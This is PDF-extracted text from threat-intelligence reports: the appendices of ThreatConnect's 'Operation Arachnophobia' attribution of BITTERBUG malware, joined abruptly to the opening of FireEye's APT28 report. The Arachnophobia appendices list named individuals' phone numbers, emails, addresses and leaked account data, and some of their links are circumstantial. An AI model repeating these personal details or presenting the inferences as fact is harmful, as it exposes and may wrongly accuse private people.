Analysis of the VPSNOC email50 header indicated that the message was sent on Thursday 25 July at 02:28:41 +0500 GMT, which
is consistent with Pakistan
s time zone. Of note, the email message was sent with an X-Originating IP Address of 184.75.214.10
corresponding to a Private Internet Access51 Canadian proxy52. VPSNOC
s use of this commercial proxy service likely
demonstrates the intent to mask the apparent origin of the sender.
These two examples highlight that VPSNOC
s inbound and outbound email communications consistently utilized a +0500
Pakistani timezone.
       Digital Appendix 1: Raw Email Communications; Email#1 Subject- Re- Contact Info (Date- Wed, 24 Jul 2013 14-00-29 -0500).eml
       Digital Appendix 2: Raw Email Communications; Email#2 Subject- Re- Contact Info (Date- Thu, 25 Jul 2013 02-28-41 +0500).eml
       https://www.privateinternetaccess.com
       http://pastebin.com/F261NfYa
20    
     OPERATION ARACHNOPHOBIA
APPENDIX D: Inconsistencies Observed
Due to the apparent Pakistani nexus within the BITTERBUG malware and the Pakistan time zone consistently observed within
the VPSNOC emails, the TCIRT applied additional scrutiny and research of the content within the Tranchulas 
Response_
ThreatConnect.docx
 to validate their claims. In the following section we will examine the inconsistencies observed. Within the
response we observed the following inconsistencies:
Inconsistency #1: Day & Date Misalignment within image1.png Screenshot
Our review of the 
Response_ThreatConnect.docx
53 focused in on the email screenshot (Figure 3) image1.png54 that Khan
provided revealing that the date probably had been modified to appear as though they were the first to notify VPSNOC. Within
the official response, Zubair Khan indicated that Tranchulas was 
already aware of this incident...and contacted hosting
company.
 The official response included a screenshot depicting an email sent to VPSNOC from an unidentified (redacted)
tranchulas.com email address that was sent on 
Tue, Jul 21, 2013 at 11:36 PM
 with no evidence of the date in which it was
received by or responded to by VPSNOC. This message contained a notable misalignment between the date and day of the week.
July 21, 2013 was a Sunday, not a Tuesday. 
Tuesday
 would have pre-dated our official notification that occurred on Wednesday
July 24, 2013, and could indicate that Tranchulas may have obtained insight into the original TCIRT notification through Pakistan-
based contacts within VPSNOC. The TCIRT subsequently responded to Mr. Khan
s official explanation with a follow-up inquiry,
offering Khan an opportunity to explain the date inconsistency within the email screenshot. Mr. Khan deferred our request to
Mr. Hamza Qamar55, a Penetration Testing Team Lead at Tranchulas, who later responded56 with a simple denial that the email
message had not been altered apart from blurring the name of the original sender.
Inconsistency #2: Awareness of Withheld Information
The email screenshot (image1.png) from within the Tranchulas response demonstrated awareness of information that we initially
withheld and later released in our blog post: one malware variant57 that contained a debug string with 
umairaziz27
 the
same username as a Tranchulas employee. The Tranchulas message to VPSNOC incorrectly claimed to identify malware on
199.91.173.43 that contained the 
company
s name and...employee
s name
. While it is possible that Tranchulas
 analysts
discovered this variant independent of the blog post, it added to the inconsistent elements of the response and further suggested
that the blog post may have inspired its communications with VPSNOC. We note that we requested additional information such as
the 
detailed analysis report
 within the exchange from Tranchulas but did not receive a response.
Inconsistency #3: Tranchulas Direct Notification
The Tranchulas response indicates that 
Tranchulas
 research team was already aware of this incident before publication
of this report. Our team contacted hosting company of server to seek an explanation.
 Considering there are no
public references to the identified infrastructure identifying VPSNOC as the 
hosting company
. The only way for Tranchulas to
identify VPSNOC as the hosting company was to either have previous insider knowledge of the activity, or to have been privately
introduced by the Kansas-City-based service provider to their 
client
 VPSNOC, of which was never mentioned or discussed when
we initially exchanged with either the Kansas-City or Pakistan-based hosting providers.
       Digital Appendix 1: Research Collateral Response_ThreatConnect.docx (MD5: 6f7010a28f33be02d85deb9ba40ec222)
       Digital Appendix 1: Research Collateral image1.png (MD5: d224f39f8e20961b776c238731821d16)
       http://pk.linkedin.com/pub/hamza-qamar/22/6b8/109
Digital Appendix 2: Raw Email Communications (Email#4 Subject- Re- Regarding 20130731A- South Asia Cyber Espionage Heats Up -
    (Date- Thu, 15 Aug 2013 12-52-54 +0500).eml
       https://www.virustotal.com/en/file/b9a062e84ab64fc55dedb4ba72f62544eb66d7e1625059d2f149707ecd11f9c0/analysis/
21    
     OPERATION ARACHNOPHOBIA
Public registration of the 199.91.173.43 reveals the Kansas-City-based hosting provider as the official registrant and owner
of the infrastructure. The only way to know that VPSNOC was subleasing the infrastructure was to obtain this information directly
from them. There was no public reference which would have revealed VPSNOC as the entity which maintained root access to the
199.91.173.43. Had Tranchulas legitimately conducted an initial victim notification sometime in late July 2013, they would have
likely done so through the Kansas-City-based hosting provider and not VPSNOC.
On August 15, 2013, Hamza Qamar
s response to TCIRT
s follow up inquiry to the observed inconsistencies redirected TCIRT
personnel to VPSNOC to obtain an explanation versus attempting to explain the observed day date inconsistency and document
properties within the Tranchulas email. The TCIRT
s suspicion mounted when presenting Tranchulas with the opportunity to set the
record straight, that Tranchulas could not substantiate their claims, rather deferring the TCIRT inquiry to a third party (VPSNOC).
Inconsistency #4: Tranchulas obtains similar response that TCIRT obtained
Within the 
Response_ThreatConnect.docx
 the image 
image1.png
 contains an undated response from VPSNOC to the
Tue, Jul 21, 2013
 Tranchulas notification. The undated VPSNOC response that Tranchulas received is nearly identical to the
response that TCIRT and the Kansas-City-based service provider obtained on July 24th. Tranchulas does not include the date or
time as to when they obtained a response from VPSNOC.
The TCIRT found it unusual that neither the Kansas-City-based service provider or VPSNOC personnel ever indicated either way
that they knew about the activity or had been previously contacted by either party. When considering all of the inconsistencies,
order of events and studying, Gmail webmail layout, similarities of keywords, salutations and closings within the 
Tue, Jul 21,
2013
 Tranchulas notification and the respective VPSNOC response. The TCIRT grew increasingly suspicious of the exchanges
with VPSNOC and subsequent exchanges with Tranchulas personnel.
Inconsistency #5: Similar Document Metadata Properties
Analysis of metadata within two benign decoy documents that were originally used within July 2013 BITTERBUG operations,
Report.docx58 and Naxalites_Funded_by_Pakistan.docx59, both maintained the author properties of 
. In reviewing the
document metadata within the 
Response_ThreatConnect.docx
 that was sent from Mr. Zubair Khan on August 6, 2013, the
TCIRT also identified that this document maintained the creator properties of 
 (Figure 10)
While the author field of 
 doesn
t conclusively prove a relationship, it contributes to a body of circumstantial evidence which
matches the document properties of the official Tranchulas response to the document properties that were also found within
decoy documents that were bundled with BITTERBUG implants.
       https://www.virustotal.com/en/file/7e940115988d64fbf7cd3b0d86cd2440529f921790578a96acac4c027120e0c5/analysis/
       https://www.virustotal.com/en/file/f689d9990a23fbde3b8688b30ff606da66021803390d0a48d02fad93dc11fa15/analysis/
22    
      OPERATION ARACHNOPHOBIA
APPENDIX E: VPSNOC & Digital Linx Associations
According to the vpsnoc.com website 
In 2007 five VPS experts decided to invest in their very own private rack space in the heart
of Kansas, the United States. Their aim? To bring service-oriented, quality managed and unmanaged VPS solutions to clients
all over the world. Just 1 year later, after beginning their enterprise on 3 servers they had filled 2 server racks with happy clients
receiving quality U.S support. Their company continued to build momentum.
Whois records for vpsnoc.com indicate that another individual registered the domain and listed Digital Linx Hosting as the registrant
organization with a Kansas City-based address, telephone number 925-665-1427, and administrative email address admin@digitallinx.
org.61 This is the same registrant record for the digitallinx.net domain.62 The digitallinx.net/sitemap.xml63 and the corresponding Google
cache64 for digitallinx.net/sitemap.xml indiciate that both digitallinx.net and digitallinx.com have shared the same sitemap.xml at the same
time. The digitallinx.net/Contact.html65 identified similar overlaps with data across the .org, .net, and .com domains.
The domain digitallinx.com is registered to Perasona #1.66 67 68 69 He uses email addresses naseer@digitallinx.com and nbhatti@
gmail.com as the domain registrant email address, along with address 638-F Johar Town, Lahore Pakistan and telephone
966.548805579.70 The DigitalLinx (digitallinx.com) website states that it is 
a web hosting / Web Solutions & Processing
Outsourcing Company based in Pakistan
Open source research of the phone number 925-665-1427 indicates that it is also used within site content as a phone number for
defiantmarketing.com. This domain is registered by Persona #2 71 who uses the aliases 
agnosticon
 and 
agnostic
. Persona #2 lists VPSNOC
as the registrant organization, and uses the registration email address of abunasar@yahoo.com with an address of House 12, Street 21, F-8/1
Islamabad Federal 44000. The domain defiantmarketing.com domain has used ns1.abunasar.net and ns2.abunasar.net for name services.
Within a January 2009 posting to a Debian users forum, Persona #2 sends an email from the abunasar@yahoo.com with a reply-to as
abunasar@army.com.72 Within the post, Persona #2 responds to the question 
s using Debian
 listing DigitalLinx, Kansas City MO and
the link to digitallinx.com. Also, the seemingly abandoned Twitter profile for Persona #273 is only following the Twitter profile for @VPSNOC.74
In an April 2012 post to blackhatworld.com, a user with the alias 
agnosticon
 posted promotional codes for VPSNOC hosting
services, engaging with customers, providing them feedback regarding VPS services and thanking them for positive reviews.75
Within the posting the user 
agnosticon
 included an image which was an actual advertisement that was hosted at http://vpsnoc.
com/order.png.76 77 Within the posted image it states 
VPSNOC is a subdivision of Digital Linx Hosting. We have been in business since
2008
. The posting concludes with 
If you have any further questions/queries please contact us directly at: support@vpsnoc.com
       http://vpsnoc.com
       https://whois.domaintools.com/vpsnoc.com
       https://whois.domaintools.com/digitallinx.net
       digitallinx.net/sitemap.xml
       http://webcache.googleusercontent.com/search?q=cache:CtCiQUGgUaoJ:www.digitallinx.net/sitemap.xml+&cd=1&hl=en&ct=clnk&gl=us
       digitallinx.net/Contact.html
       https://whois.domaintools.com/digitallinx.com
       http://sa.linkedin.com/pub/muhammad-naseer-bhatti/9/18a/815
       https://groups.google.com/forum/#!original/securityfocus2/9325p2as3IU/BqKQJwdlZ4YJ
       Appendix F: Personas; Persona #1 Muhammad Naseer Bhatti
       https://github.com/digitallinx/vBilling/blob/master/CHANGELOG
       Appendix F: Personas; Persona #2 Abunasar Khan
       https://lists.debian.org/debian-www/2009/01/msg00186.html
       https://twitter.com/abunasar
       https://twitter.com/vpsnoc
       http://www.blackhatworld.com/blackhat-seo/members/32481-agnosticon.html
       http://www.blackhatworld.com/blackhat-seo/hosting/430705-unmetered-vps-hosting-get-50-off-your-first-month-exclusive-coupons-bhw.html
       http://vpsnoc.com/order.png
23    
      OPERATION ARACHNOPHOBIA
APPENDIX F: Personas
Persona #1:
Muhammad Naseer Bhatti
s LinkedIn profile indicates that he is currently the founder for Digital Linx LLC and vBilling (vbilling.org)
as well as a consultant for a U.S. company78. Both Bhatti and Digital Linx are listed as the registrants for vbilling.org79, v-billing.
com80, vgriffins.com81 and my-server.co82, which use P.O. Box 295658, Riyadh Saudi Arabia83 as the registration address. This
is also the address for two U.S. companies
 local operations. Bhatti is also listed as the owner of the netblock 46.4.139.224/28.
Both passive DNS sources as well as Robtex84 highlight this overlapping infrastructure.85
From September 7 - 9, 2011, Tranchulas in cooperation with the Pakistan National University of Sciences and Technology86
(NUST), offered a Certified Penetration Testing Profession (CPTP) Workshop87 (Figure 17). During the workshop, basic penetration
techniques and skills were presented88. It is likely that CPTP workshops and alignment with NUST have allowed Tranchulas the
opportunity to recruit student interns.89
       http://sa.linkedin.com/pub/muhammad-naseer-bhatti/9/18a/815
       http://whois.domaintools.com/vbilling.org
       http://whois.domaintools.com/v-billing.com
       http://whois.domaintools.com/vgriffins.com
       http://whois.domaintools.com/my-server.co
       http://saudi.emc.com/contact/contact-us.htm
       https://www.robtex.com/dns/digitallinx.com.html
       http://whatmyip.co/info/whois/46.4.139.225
www.nust.edu.pk
       http://seecs.nust.edu.pk/Seminars_workshops/pages/tranchulas_hacking_workshop/index.php
       Digital Appendix 1: Research Collateral (Program.pdf)
       http://www.nust.edu.pk/INSTITUTIONS/Directortes/ilo/Download%20Section/Graduate%20Profiles%20booklet-%202013%20(SEECS).pdf
24    
      OPERATION ARACHNOPHOBIA
                          Figure 17: Muhammad Nasser Tranchulas CPTP Registration Point of Contact
Within the CPTP event registration contact information for Muhammad Naseer was listed next to a Tranchulas office number (051-
2871433)90. It is important to note that Muhammad Naseer Bhatti has been previously known to drop91 the family name 
Bhatti
       http://www.linkedin.com/groups/Tranchulas-Handson-Ethical-Hacking-Training-2616369.S.75237952
       https://groups.google.com/forum/#!original/securityfocus2/9325p2as3IU/BqKQJwdlZ4YJ
25    
      OPERATION ARACHNOPHOBIA
within online correspondence (Figure 18). In a June 2012 episode of Engineering and Technology Magazine92 podcast a Mohammed
Nasser, Penetration Tester at Tranchulas was interviewed93. A Mohammed Nasser may also be directly affiliated94 with Tranchulas.
                                     Figure 18: Muhammad Nasser Bhatti Dropping Family Name
This links Tranchulas to a Pakistani employee or consultant also named Muhammad Naseer. It is unknown if this is the same
Muhammad Naseer that is associated with VPSNOC
s parent company Digital Linx, the Pakistan-based service provider which
hosted the original BITTERBUG malware.
       http://eandt.theiet.org/magazine/2012/06/
       http://eandt.theiet.org/magazine/2012/06/et-podcast-18.cfm
       http://www.zoominfo.com/s/#!search/profile/person?personId=1627460418&targetid=profile
26    
      OPERATION ARACHNOPHOBIA
Persona #2:
Abunasar Khan also maintains the aliases 
agnosticon
95 and 
agnostic
96 in addition to the email addresses abunasar@yahoo.
com and abunasar@army.com. He has been previously associated97with VPSNOC & Digital Linx. An April 2012 Whois registrant
record for the domain zeusadnetwork.com98 includes the first and last name Khan along with the same (925) 665-1427 phone
number seen within the Digial Linx Hosting domains.
Khan registered a variety of domains, many of which use his abunasar.net99 for name services and abunasar.yahoo.com within
the Start of Authority (SOA) records. For example a July 2014 record (Figure 19) for defiantmarketing.com100 and an August 2013
record (Figure 20) for ns2.vpsnoc.com both maintain these references.
                                      Figure 19: SOA record for defiantmarketing.com (July 2014)
        http://www.blackhatworld.com/blackhat-seo/members/32481-agnosticon.html
        http://www.redlinegti.com/forum/viewtopic.php?f=3&t=41719&p=401115
        http://www.webhostingtalk.com/showthread.php?t=723658
        http://whois.domaintools.com/zeusadnetwork.com
        http://whois.domaintools.com/abunasar.net
       http://bgp.he.net/dns/defiantmarketing.com
27     
      OPERATION ARACHNOPHOBIA
                                          Figure 20: SOA Record for vpsnoc.com (August 2013)
Abunasar Khan registered abunasar.net and previously (May 2007) and maintained whitehate.org101, which have both been used
to demonstrate an affinity for and alignment with AntiSec and Anonymous movements.102 The abunasar.net website prominently
displays ascii art of the term 
antisec
 with antisec related content 
Blend in. Get trusted. Trust nobody. Own everybody. Disclose
nothing. Destroy everything. Take back the scene.
 This is a shared affinity that is also reflected amongst with the culture of
Tranchulas employees.103 104 105 The pure.whitehate.org domain has also been previously associated with Khan, examples can be
found within #phrack and #darknet IRC sessions.106 107
Ironically, in February 2011, Khan
s Rootkit.com user profile was compromised revealing his profile
s username, password hash,
email (abunasar@army.com), and the registration IP address of 202.125.143.67 (Islamabad, Pakistan).108 During his registration,
Khan specified the name 
anony mo us
 when registering the profile. As of 16 August 2013, a Pastebin post contained details of
a customer database compromise for nowclothing.pk, which included Khan
s name, email abunasar@army.com, and cell phone
number 03215488881.109 110
Research of the 03215488881 cell phone number yields a user profile 
abunasark
 in an April 2009 posting.111 Khan posts
pictures of his blue Baleno and includes another phone number 03234764838.112 In a secondary profile user 
 uses the same
cell phone number 03215488881 in a 2009 sales posting for a 2004 blue Baleno.113 114
       https://whois.domaintools.com/whitehate.org
       https://whois.domaintools.com/abunasar.net
       https://www.facebook.com/media/set/?set=a.542485719112184.135023.132987340062026&type=3
       http://youtube.com/watch?v=w3DjOuEI0vs.mov
       Digital Appendix 3: Screenshot Archives (youtube.com/watch?v=w3DjOuEI0vs.mov)
       http://pastebin.com/rqVGqh1q
       http://shootingsawk.lescigales.org/misc/owneddarknet.txt
       https://dazzlepod.com/rootkit/?page=284
       http://pastebin.com/ktR3qM3K
       Digital Appendix 3: Screenshot Archives (pastebin.com/ktR3qM3K.png)
       http://www.pakwheels.com/forums/user/abunasark
       http://www.pakwheels.com/forums/members-member-rides/99428-white-baleno-not-anymore-comments-please-p-4
       http://www.motors.pk/ak-22.htm
       http://www.motors.pk/used-cars/suzuki-baleno-2004-for-sale-in-islamabad-22.htm
28     
      OPERATION ARACHNOPHOBIA
Khan
s affinity for Suzuki Baleno cars is made obvious in a May 2009 registration for clubaleno.co.uk that was registered by Khan
at VPSNOC using the name services of ns1.abunasar.net and ns2.abunasar.net with a SOA record of abunasar.yahoo.com.115 116
Later in a June 2009 posting, Khan using the alias 
agnostic
 attempts to sell the domain clubaleno.co.uk and uses his abunasar@
army.com email address as a point of contact.117
Khan is also observed using the alias 
agnosticon
 and a Toyota Racing Development avitar within posts to blackhatworld.com
and again within a 2011 post where he posts a cpanel error that also includes his 
abunasar
 username within system output.118
The Google+ profile for Khan119 reveals established social network links to a Team Lead for Penetration Testing at Tranchulas and
a Digital Linx employee Shoaib Riaz120 who also maintains a social network association with the Digital Linx founder Muhammad
Nasser Bhatti.121
       http://www.sitetrail.com/clubaleno.co.uk
       http://dawhois.com/site/clubaleno.co.uk.html
       http://www.redlinegti.com/forum/viewtopic.php?f=3&t=41719&p=401115
       http://forums.cpanel.net/f5/help-yum-broke-rpm-db-broke-somehow-httpd-wont-start-238511.html
       https://plus.google.com/103436628630566104748/posts
       https://plus.google.com/105059395104464629441/about
       https://plus.google.com/105855064276291727409/posts
29     
      OPERATION ARACHNOPHOBIA
APPENDIX G: Tranchulas
The Tranchulas website122 states that they provide a range of security services and training to include penetration and offensive
cyber initiative (OCI), in which they 
help national level cyber security programs on strategies for managing offensive technical
threats
. In a September 2011 YouTube user 
tranchulascert
 posted a video titled 
Tranchulas Cyber Ranges - P@sha ICT Awards
2011123
, where they awarded runner up124. Within the video, the cyber ranges were referenced as being developed for 
defense
forces
 that were aimed to 
help them in developing offensive and defensive warfare skills
 and 
combating anti-state hackers
Although Tranchulas125 brands itself as a multi-national company, their respective operating addresses within United Kingdom126
the United States127 and New Zealand128 are all associated with either virtual office spaces or address forwarding services. The
Tranchulas website lists its Pakistan address within the 2nd floor of the Evacuee Trust Complex129 on Sir Agha Khan Road F-5/1
Islamabad 44000. The Evacuee Trust Complex is also known as Software Technology Park 2130 or STP2 and hosts a variety131 of
other commercial and government offices.
The Tranchulas employee, Hamza Qamar, that handled the response to our inquiry has a public LinkedIn132 profile that states that
Engaged in system and enterprise level network and Web application security testing for clients ranging from large federal
agencies, DoD, and commercial clients.
 The profile does not specify if DoD is a reference to the U.S. Department of Defense or
another country
s Ministry of Defense. Interestingly, Qamar
s Google+ page showed one 
friend
 in his circle despite more than 40
followers, Abunasar Khan a VPSNOC employee.
It is likely that Tranchulas provides services to the Pakistani government. The offensive cyber initiative services offered by
Tranchulas is offered to 
national-level cyber security programs
 suggesting a commercial demand from 
national-level
 customers.
The stated purpose and intent of the Tranchulas 
Cyber Ranges
 P@sha ICT 2011 awards video suggests the ranges were
specifically developed in support of national interests for offensive and defensive purposes. The domain registration by Zubair
Khan using an official Pakistani government address with his zubair@tranchulas.com email address indicates that Khan may have
or currently maintains a physical address at a location where other Pakistani government officials reside.
Historic Whois registration records for the domains textcrypter.com133, taggnation.com134, bookadoconline.com135 and saadiakhan.
net136 lists Tranchulas CEO Zubair Khan (zubair@tranchulas.com137) as the registrant for the domains. At the time of registration
Khan used the address 15-B, Mehran Block of the Gulshan-e-Jinnah F-5/1 Islamabad Pakistan for the domains.
   http://tranchulas.com
   https://www.youtube.com/watch?v=FAM6JxOHdo8
   http://pashaictawards.com/?page_id=1644
   http://tranchulas.com/contact-us/
   http://www.londonpresence.com/contact-us/
   http://nextspace.us/nextspace-union-square-san-francisco/
   http://www.privatebox.co.nz/virtual-office/virtual-office-address.php
   https://www.facebook.com/EvacueeTrustComplex
   http://wikimapia.org/425791/Evacuee-Trust-Complex
   https://www.facebook.com/EvacueeTrustComplex/photos/a.554791821273808.1073741825.404981572921501/554791824607141/
   http://pk.linkedin.com/pub/hamza-qamar/22/6b8/109
   https://whois.domaintools.com/textcrypter.com
   https://whois.domaintools.com/taggnation.com
   https://whois.domaintools.com/bookadoconline.com
   https://whois.domaintools.com/saadiakhan.net
   https://reversewhois.domaintools.com/?email=b249ca637ef7cc55a0136bcda9dca0d3
30     
   OPERATION ARACHNOPHOBIA
In an April 2008 Request for Proposals, the Pakistan Public Works Department issued a tender138 for the Constriction of
Government Servant Quarters and Garages at Gulshan-e-Jinnah Complex F-5/1 Islamabad. Later in May of 2010 within a
Pakistani Senate139 question and answer session, the Gulshan-e-Jinnah Complex was cited under Federal Lodges / Hostels in
Islamabad under the control of Pakistan Ministry for Housing and Works. A December 2010 TheNews Pakistan ran a story140
that detailed the differential in rents between commoners within Islamabad and Pakistani government officers accommodated
at Gulshan-e-Jinnah. According to Google Maps141 it is approximately 650 meters (8 minute walk) from the Gulshan-e-Jinnah
Complex to the Tranchulas offices within the Evacuee Trust Complex.
Within a May 2013 interview142 Khan specified that he comes from a family with a strong military background. He detailed his
interest in 
the world of hacking
 grew during his teen years, referencing his father
s diplomatic assignment to the Philippines in
2003. Khan would go on to establish Tranchulas in February 2006 after an independent audit of Pakistani Governments National
Database and Registration Authority (NADRA).
       http://www.dgmarket.com/tenders/np-notice.do?noticeId=2466880
       http://www.senate.gov.pk/uploads/documents/questions/1317711132_399.pdf
       http://www.thenews.com.pk/Todays-News-2-22150-Bureaucrats-journalists-avail-cheaper-accommodation
https://www.google.com/maps/dir/Tranchulas,+Islamabad,+Pakistan/Gulshan-e-Jinnah+Complex,+Islamabad,+Pakistan/@33.7327466,7
     3.0877996,17z/data=!4m13!4m12!1m5!1m1!1s0x38dfc0820ff3f9e3:0x4b3eb557d9cd81c3!2m2!1d73.088686!2d33.73353!1m5!1m1!1s0
     x38dfc0818a64f1d7:0x82c3bee2d49d88ab!2m2!1d73.089409!2d33.73263?hl=en-US
       http://bluechipmag.com/qa-with-zubair-khan/
31     
     OPERATION ARACHNOPHOBIA
Digital Appendix 1: Research Collateral
Digital Appendix 1 contains additional research collateral collected when conducting Operation Arachnophobia research.
32   
   OPERATION ARACHNOPHOBIA
Digital Appendix 2: Raw Email Communications
Digital Appendix 2 contains raw email communications. These .eml files include raw SMTP headers, content and attachments.
33   
   OPERATION ARACHNOPHOBIA
Digital Appendix 3: Screenshot Archives
Digital Appendix 3 contains screenshots of web content used to conduct analysis.
34   
   OPERATION ARACHNOPHOBIA
Digital Appendix 4: Maltego Visualization
Digital Appendix 4 contains visualization files that depict relationships and contain metadata associated with our Operation
Arachnophobia research.
35   
    OPERATION ARACHNOPHOBIA
                               SPECIAL REPORT
APT28:
A WINDOW INTO RUSSIA
S CYBER
ESPIONAGE OPERATIONS?
                 SECURITY
                 REIMAGINED
APT 28: A Window into Russia
s Cyber Espionage Operations?
CONTENTS
EXECUTIVE SUMMARY.................................................................................................................................................................................................................................................................................... 3
APT28 TARGETING REFLECTS RUSSIAN INTERESTS......................................................................................................................................................................... 6
             APT28 interest in the Caucasus, Particularly Georgia............................................................................................................................................................ 7
                           APT28 Targeting of the Georgian Ministry of Internal Affairs (MIA)........................................................................................ 8
                           APT28 Targeting of the Georgian Ministry of Defense........................................................................................................................................ 9
                           APT28 Targeting a Journalist Covering the Caucasus....................................................................................................................................... 10
                           APT28
s Other Targets in the Caucasus........................................................................................................................................................................................ 11
             APT28 Targeting of Eastern European Governments and Militaries.................................................................................................... 12
             APT28 Targeting of NATO and Other European Security Organizations..................................................................................... 14
APT28 Targets European Defense Exhibitions................................................................................................................................................................ 16
             Other APT28 Targets Are Consistent With Nation State Interests......................................................................................................... 17
APT28 MALWARE INDICATES SKILLED RUSSIAN DEVELOPERS......................................................................................................................... 19
             Modular Implants Indicate a Formal Development Environment............................................................................................................... 24
             APT28 Malware Indicates Russian Speakers in a Russian Time Zone................................................................................................. 25
                           Compile Times Align with Working Hours in Moscow and St. Petersburg................................................................ 27
CONCLUSION.................................................................................................................................................................................................................................................................................................................. 28
APPENDIX A: DISTINGUISHING THREAT GROUPS.......................................................................................................................................................................... 29
APPENDIX B: TIMELINE OF APT28 LURES.......................................................................................................................................................................................................... 30
APPENDIX C: SOURFACE/CORESHELL...................................................................................................................................................................................................................... 31
APPENDIX D: CHOPSTICK.................................................................................................................................................................................................................................................................... 35
APPENDIX E: OLDBAIT................................................................................................................................................................................................................................................................................. 43
2 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
EXECUTIVE SUMMARY
Our clients often ask us to assess the threat Russia poses in cyberspace. Russia has
long been a whispered frontrunner among capable nations for performing
sophisticated network operations. This perception is due in part to the Russian
government
s alleged involvement in the cyber attacks accompanying its invasion of
Georgia in 2008, as well as the rampant speculation that Moscow was behind a
major U.S. Department of Defense network compromise, also in 2008. These
rumored activities, combined with a dearth of hard evidence, have made Russia into
something of a phantom in cyberspace.
                             In this paper we discuss a threat group whose                                     the country of Georgia, Eastern European
                             malware is already fairly well-known in the                                       governments and militaries, and European
                             cybersecurity community. This group, unlike the                                   security organizations since at least 2007.
                             China-based threat actors we track, does not                                      They compile malware samples with Russian
                             appear to conduct widespread intellectual                                         language settings during working hours
                             property theft for economic gain. Nor have we                                     consistent with the time zone of Russia
s major
                             observed the group steal and profit from                                          cities, including Moscow and St. Petersburg.
                             financial account information.
                                                                                                               While we don
t have pictures of a building,
                             The activity that we profile in this paper                                        personas to reveal, or a government agency to
                             appears to be the work of a skilled team of                                       name, what we do have is evidence of long-
                             developers and operators collecting intelligence                                  standing, focused operations that indicate a
                             on defense and geopolitical issues 
 intelligence                                 government sponsor 
 specifically, a
                             that would only be useful to a government. We                                     government based in Moscow.
                             believe that this is an advanced persistent
                             threat (APT) group engaged in espionage                                           We are tracking this group as APT28.
                             against political and military targets including
                             1
                                  Markoff, John. 
Before the Gunfire, Cyberattacks
. The New York Times 12 August 2008. Web. http://www.nytimes.com/2008/08/13/technology/13cyber.html
                              2
                                  Knowlton, Brian. 
Military Computer Attack Confirmed
. The New York Times. 25 August 2010. Web. http://www.nytimes.com/2010/08/26/
                                  technology/26cyber.html
3 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
 KEY FINDINGS
APT28 targets insider information
related to governments, militaries, and
security organizations that would
likely benefit the Russian government.
  GEORGIA                                         EASTERN EUROPE                           SECURITY ORGANIZATIONS
  APT28 likely seeks to collect intelligence      APT28 has demonstrated interest in       APT28 appeared to target individuals
  about Georgia
s security and political          Eastern European governments and         affiliated with European security
  dynamics by targeting officials working         security organizations. These victims    organizations and global multilateral
  for the Ministry of Internal Affairs and        would provide the Russian government     institutions. The Russian government
  the Ministry of Defense.                        with an ability to predict policymaker   has long cited European security
                                                  intentions and gauge its ability to      organizations like NATO and the OSCE
                                                  influence public opinion.                as existential threats, particularly during
                                                                                           periods of increased tension in Europe.
4 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                                                                         Malware compile times suggest
                                                                         that APT28 developers have
                                                                         consistently updated their tools
                                                                         over the last seven years.
 KEY FINDINGS
                                                             Since 2007, APT28 has systematically evolved its malware,
                                                             using flexible and lasting platforms indicative of plans for
                                                             long-term use. The coding practices evident in the group
                                                             malware suggest both a high level of skill and an interest in
                                                             complicating reverse engineering efforts.
   Malware compile times suggest that APT28 developers               
   APT28 tailors implants for specific victim
       have consistently updated their tools over the last                    environments. They steal data by configuring their
       seven years.                                                           implants to send data out of the network using a victim
   APT28 malware, in particular the family of modular                     network
s mail server.
       backdoors that we call CHOPSTICK, indicates                       
   Several of APT28
s malware samples contain counter-
       a formal code development environment. Such an                         analysis capabilities including runtime checks to
       environment would almost certainly be required to                      identify an analysis environment, obfuscated strings
       track and define the various modules that can be                       unpacked at runtime, and the inclusion of unused
       included in the backdoor at compile time.                              machine instructions to slow analysis.
  Indicators in APT28
s malware suggest that the group consists of
  Russian speakers operating during business hours in Russia
s major cities.
  More than half of the malware samples with Portable                  Over 96% of the malware samples we have attributed to APT28
  Executable (PE) resources that we have attributed to APT28           were compiled between Monday and Friday. More than 89%
  included Russian language settings (as opposed to neutral or         were compiled between 8AM and 6PM in the UTC+4 time zone,
  English settings), suggesting that a significant portion of          which parallels the working hours in Moscow and St.
  APT28 malware was compiled in a Russian language build               Petersburg. These samples had compile dates ranging from
  environment consistently over the course of six years (2007          mid-2007 to September 2014.
  to 2013).
5 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
Three themes in APT28
s targeting clearly
reflect areas of specific interest to an
Eastern European government, most likely
the Russian government.
APT28 TARGETING REFLECTS
RUSSIAN
INTERESTS
            any of APT28
s targets align generally                            whose accounts APT28 hopes to breach, the                 APT 28: Three Themes
            with interests that are typical of any                            subjects of the lures provide clues as to APT28
            government. However, three themes in                              targets and interests. For example, if the group
APT28
s targeting clearly reflects areas of specific                          lures repeatedly refer to the Caucasus, then this
interest to an Eastern European government, most                              most likely indicates that APT28 is trying to gain        The Caucasus,
likely the Russian government. These include the                              access to the accounts of individuals whose work          particularly the
                                                                                                                                        country of Georgia
Caucasus (especially the Georgian government),                                pertains to the Caucasus. Similarly, APT28
s practice
Eastern European governments and militaries, and                              of registering domains that mimic those of legitimate
specific security organizations.                                              news, politics, or other websites indicates topics that
                                                                              are relevant to APT28
s targets.
APT28 uses spearphishing emails to target its                                                                                           Eastern European
victims, a common tactic in which the threat group                            We identified three themes in APT28
s lures and           governments and
crafts its emails to mention specific topics (lures)                          registered domains, which together are                    militaries
relevant to recipients. This increases the                                    particularly relevant to the Russian government.
likelihood that recipients will believe that the
email is legitimate and will be interested in                                 In addition to these themes, we have seen APT28
opening the message, opening any attached files,                              target a range of political and military                  The North Atlantic
or clicking on a link in the body of the email. Since                         organizations. We assess that the work of these           Treaty Organization
                                                                                                                                        (NATO) and other
spearphishing lures are tailored to the recipients                            organizations serves nation state governments.
                                                                                                                                        European security
                                                                                                                                        organizations
  Bloomberg. 
Neiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data.
 February 2014.
  Ibid.
  Ibid.
6 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
APT28 INTEREST IN
THE CAUCASUS,
PARTICULARLY GEORGIA
                                                             RUSSIA
                   Abkhazia                                                                    Chechnya
                                                                                             Kavkaz Center
                                                                GEORGIA
                                                                                  Tbilisi
                                                                              ARMENIA
                        TURKEY                                                                               AZERBAIJAN
                                                                        Armenian Military
                                                                              Yerevan
                             T
                                     he Caucasus, a region that includes            Since 2011, APT28 has used lures written in
                                     Chechnya and other Russian republics and       Georgian that are probably intended to target
